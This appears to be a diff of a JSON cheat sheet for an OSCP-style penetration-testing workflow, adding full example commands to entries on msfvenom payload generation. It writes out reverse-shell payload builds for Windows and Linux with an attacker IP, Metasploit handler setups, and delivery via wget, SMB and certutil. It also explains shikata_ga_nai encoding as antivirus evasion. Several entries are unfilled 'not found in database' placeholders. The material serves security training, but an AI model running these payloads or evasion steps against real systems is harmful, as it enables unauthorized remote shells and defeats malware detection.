@@ -69,7 +69,7 @@
             "msfvenom-list-encoders"
           ],
           "expected_outcome": "msfvenom with -b '\\x00\\x0a\\x0d' generates shellcode: 'unsigned char buf[] = \"\\xdb\\xc0\\xba\\x4c\\x77\\x2f\\x14\\xd9\\x74\\x24\\xf4...\"'. Output shows: 'Payload size: 368 bytes (after encoding)', 'Final size of c file: 368 bytes', 'Bad characters avoided: \\x00\\x0a\\x0d'. Shikata_ga_nai encoder: Polymorphic (changes each generation), Produces alphanumeric-heavy shellcode, Decodes at runtime (self-decrypting stub). Alternative encoders: x86/alpha_mixed (only A-Z, a-z, 0-9 - large size increase ~2x), x86/call4_dword_xor (XOR encoding, moderate evasion), cmd/powershell_base64 (PowerShell delivery, fully alphanumeric). Multiple iterations (-i 5): Each iteration re-encodes previous output, Increases size but improves AV evasion, Diminishing returns after 3-5 iterations. Time: 5-10 seconds per encoding attempt. Testing: Hex dump payload: xxd -p <<< '$buf', Verify no bad chars: grep '\\x00' (should return nothing). Common issues: Encoded payload too large for buffer (use smaller payload or different encoder), Decoder stub contains bad chars (try -e x86/alpha_mixed), Payload still detected by AV (try -i 10 or custom encoder).",
-          "why_this_works": "Bad character filtering: Applications filter inputs: SQL queries filter quotes (', \"), HTTP headers filter line breaks (\\x0a, \\x0d), Buffer overflows may filter null bytes (\\x00 terminates strings in C), Format string attacks filter percent signs (%). Unfiltered shellcode injection fails if payload contains bad chars. msfvenom -b flag: Analyzes payload for specified bytes, Uses encoder to transform payload, Ensures final shellcode doesn't contain bad chars, Adds decoder stub (small assembly code) to decrypt at runtime. Encoder selection: shikata_ga_nai (most common): Polymorphic XOR cipher, Different output each run (defeats signature-based AV), Adds ~20-30 bytes overhead, Decoder stub usually 14 bytes. alpha_mixed: Alphanumeric encoding (A-Z, a-z, 0-9), Avoids ALL non-printable characters, Large size increase (2-3x original), Useful for strict filters (SQL injection, HTTP headers). call4_dword_xor: XOR-based encoding, Moderate evasion, Smaller overhead than shikata. Encoder limitations: Some encoders create bad chars in decoder stub (-b may not eliminate all), Alpha encoders significantly increase payload size (500 bytes → 1500 bytes), Multiple iterations (-i) help but increase size further. Runtime decoding: Encoded payload structure: Decoder stub (assembly code, 10-30 bytes) + Encrypted payload (original shellcode XOR encoded), On execution: 1) CPU executes decoder stub, 2) Decoder decrypts payload in memory, 3) Jumps to decrypted shellcode, 4) Original payload executes. AV evasion strategy: Signatures target known shellcode bytes (Metasploit payloads well-known), Encoding changes byte patterns (defeats static signatures), Multiple iterations change patterns further (-i 5), Polymorphism (shikata) produces unique output each time. OSCP notes: Always specify -b '\\x00' at minimum (null bytes break string-based exploits), Test encoded payload locally before live attempt (avoid burning exploit), Balance size vs evasion (smaller encoder for tight buffers, aggressive encoding for AV), Use xxd or hexdump to verify no bad chars in final payload. Troubleshooting: Decoder stub contains bad chars: msfvenom -b '\\x00' -e x86/alpha_mixed (alphanumeric decoder), Payload too large after encoding: Use smaller base payload: msfvenom -p windows/exec CMD=calc (minimal test payload, ~100 bytes), Try different encoder with less overhead: msfvenom -l encoders (shows size metrics). Buffer overflow testing workflow: 1) Fuzz application to identify bad chars, 2) Generate payload with -b to avoid bad chars, 3) Embed in exploit script with correct offset, 4) Test locally in debugger (gdb, Immunity Debugger), 5) Deploy against target."
+          "why_this_works": "Bad character filtering: Applications filter inputs: SQL queries filter quotes (', \"), HTTP headers filter line breaks (\\x0a, \\x0d), Buffer overflows may filter null bytes (\\x00 terminates strings in C), Format string attacks filter percent signs (%). Unfiltered shellcode injection fails if payload contains bad chars. msfvenom -b flag: Analyzes payload for specified bytes, Uses encoder to transform payload, Ensures final shellcode doesn't contain bad chars, Adds decoder stub (small assembly code) to decrypt at runtime. Encoder selection: shikata_ga_nai (most common): Polymorphic XOR cipher, Different output each run (defeats signature-based AV), Adds ~20-30 bytes overhead, Decoder stub usually 14 bytes. alpha_mixed: Alphanumeric encoding (A-Z, a-z, 0-9), Avoids ALL non-printable characters, Large size increase (2-3x original), Useful for strict filters (SQL injection, HTTP headers). call4_dword_xor: XOR-based encoding, Moderate evasion, Smaller overhead than shikata. Encoder limitations: Some encoders create bad chars in decoder stub (-b may not eliminate all), Alpha encoders significantly increase payload size (500 bytes \u2192 1500 bytes), Multiple iterations (-i) help but increase size further. Runtime decoding: Encoded payload structure: Decoder stub (assembly code, 10-30 bytes) + Encrypted payload (original shellcode XOR encoded), On execution: 1) CPU executes decoder stub, 2) Decoder decrypts payload in memory, 3) Jumps to decrypted shellcode, 4) Original payload executes. AV evasion strategy: Signatures target known shellcode bytes (Metasploit payloads well-known), Encoding changes byte patterns (defeats static signatures), Multiple iterations change patterns further (-i 5), Polymorphism (shikata) produces unique output each time. OSCP notes: Always specify -b '\\x00' at minimum (null bytes break string-based exploits), Test encoded payload locally before live attempt (avoid burning exploit), Balance size vs evasion (smaller encoder for tight buffers, aggressive encoding for AV), Use xxd or hexdump to verify no bad chars in final payload. Troubleshooting: Decoder stub contains bad chars: msfvenom -b '\\x00' -e x86/alpha_mixed (alphanumeric decoder), Payload too large after encoding: Use smaller base payload: msfvenom -p windows/exec CMD=calc (minimal test payload, ~100 bytes), Try different encoder with less overhead: msfvenom -l encoders (shows size metrics). Buffer overflow testing workflow: 1) Fuzz application to identify bad chars, 2) Generate payload with -b to avoid bad chars, 3) Embed in exploit script with correct offset, 4) Test locally in debugger (gdb, Immunity Debugger), 5) Deploy against target."
         }
       ],
       "sections": [
@@ -77,44 +77,100 @@
           "title": "Phase 1: Payload Selection (Match Target Platform)",
           "notes": "Identify target OS and architecture (Windows x86/x64, Linux x86/x64, web platform). Use msfvenom -l payloads | grep <platform> to list options. Common choices: Windows reverse shell (windows/x64/shell_reverse_tcp), Linux reverse shell (linux/x64/shell_reverse_tcp), PHP web shell (php/meterpreter_reverse_tcp), ASPX web shell (windows/meterpreter/reverse_tcp -f aspx). Staged (/) for small size, non-staged (_) for reliability. Estimated time: 1-2 minutes.",
           "commands": [
-            "msfvenom-windows-reverse",
-            "msfvenom-linux-reverse",
-            "msfvenom-php-shell",
-            "msfvenom-aspx-shell"
+            {
+              "id": "msfvenom-windows-reverse",
+              "example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe",
+              "shows": "No encoder specified, outputting raw payload"
+            },
+            {
+              "id": "msfvenom-linux-reverse",
+              "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf",
+              "shows": "Payload size displayed"
+            },
+            {
+              "id": "msfvenom-php-shell",
+              "example": "[Command msfvenom-php-shell not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "msfvenom-aspx-shell",
+              "example": "[Command msfvenom-aspx-shell not found in database]",
+              "shows": "See command documentation"
+            }
           ]
         },
         {
           "title": "Phase 2: Format and Encoding Configuration",
           "notes": "Select output format: -f exe (Windows executable), -f elf (Linux binary), -f raw (web shells, raw shellcode), -f c (C array for exploit scripts). Add encoding if needed: -e x86/shikata_ga_nai (polymorphic AV evasion), -b '\\x00\\x0a\\x0d' (avoid bad characters), -i 3-5 (multiple encoding iterations). Estimated time: 5-10 seconds per generation.",
           "commands": [
-            "msfvenom-encode-shikata",
-            "msfvenom-badchars",
-            "msfvenom-list-formats"
+            {
+              "id": "msfvenom-encode-shikata",
+              "example": "[Command msfvenom-encode-shikata not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "msfvenom-badchars",
+              "example": "[Command msfvenom-badchars not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "msfvenom-list-formats",
+              "example": "[Command msfvenom-list-formats not found in database]",
+              "shows": "See command documentation"
+            }
           ]
         },
         {
           "title": "Phase 3: Handler Setup (If Using Meterpreter)",
-          "notes": "Web shells and Meterpreter payloads require multi/handler. Basic shells (shell_reverse_tcp) can use nc listener. Set up handler: use exploit/multi/handler; set payload <matching_payload>; set LHOST <IP>; set LPORT <PORT>; exploit. Match payload exactly (php/meterpreter_reverse_tcp in msfvenom → php/meterpreter_reverse_tcp in handler). Estimated time: 30-60 seconds.",
+          "notes": "Web shells and Meterpreter payloads require multi/handler. Basic shells (shell_reverse_tcp) can use nc listener. Set up handler: use exploit/multi/handler; set payload <matching_payload>; set LHOST <IP>; set LPORT <PORT>; exploit. Match payload exactly (php/meterpreter_reverse_tcp in msfvenom \u2192 php/meterpreter_reverse_tcp in handler). Estimated time: 30-60 seconds.",
           "commands": [
-            "msf-handler-setup",
-            "msf-handler-background"
+            {
+              "id": "msf-handler-setup",
+              "example": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run",
+              "shows": "Started reverse TCP handler on <LHOST>:<LPORT>"
+            },
+            {
+              "id": "msf-handler-background",
+              "example": "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j",
+              "shows": "Exploit running as background job <ID>"
+            }
           ]
         },
         {
           "title": "Phase 4: Delivery and Execution",
           "notes": "Transfer payload to target: HTTP (python3 -m http.server 8000; wget http://<ATTACKER>/shell.exe), SMB (impacket-smbserver share . -smb2support; copy \\\\<ATTACKER>\\share\\shell.exe), Web upload (upload via form), Base64 encoding (certutil -decode shell.b64 shell.exe on Windows). Execute: Windows (shell.exe, powershell -c shell.exe), Linux (chmod +x shell.elf; ./shell.elf), Web (browse to http://target/uploads/shell.php). Estimated time: 2-5 minutes.",
           "commands": [
-            "msfvenom-windows-reverse",
-            "msfvenom-linux-reverse",
-            "msfvenom-php-shell"
+            {
+              "id": "msfvenom-windows-reverse",
+              "example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe",
+              "shows": "No encoder specified, outputting raw payload"
+            },
+            {
+              "id": "msfvenom-linux-reverse",
+              "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf",
+              "shows": "Payload size displayed"
+            },
+            {
+              "id": "msfvenom-php-shell",
+              "example": "[Command msfvenom-php-shell not found in database]",
+              "shows": "See command documentation"
+            }
           ]
         },
         {
           "title": "Phase 5: Verification and Troubleshooting",
           "notes": "Verify payload execution: Check handler/listener for connection. If no connection: Check firewall (try different port: 80, 443, 53), Verify LHOST correct (ip a on attacker), Test payload locally (wine shell.exe, ./shell.elf), Check AV logs (payload detected). If connection but no session: Payload/handler mismatch (staged vs non-staged), Wrong payload type for handler (shell vs meterpreter). Regenerate payload if needed. Estimated time: 2-10 minutes for troubleshooting.",
           "commands": [
-            "msfvenom-windows-reverse",
-            "msf-handler-setup"
+            {
+              "id": "msfvenom-windows-reverse",
+              "example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe",
+              "shows": "No encoder specified, outputting raw payload"
+            },
+            {
+              "id": "msf-handler-setup",
+              "example": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run",
+              "shows": "Started reverse TCP handler on <LHOST>:<LPORT>"
+            }
           ]
         }
       ],
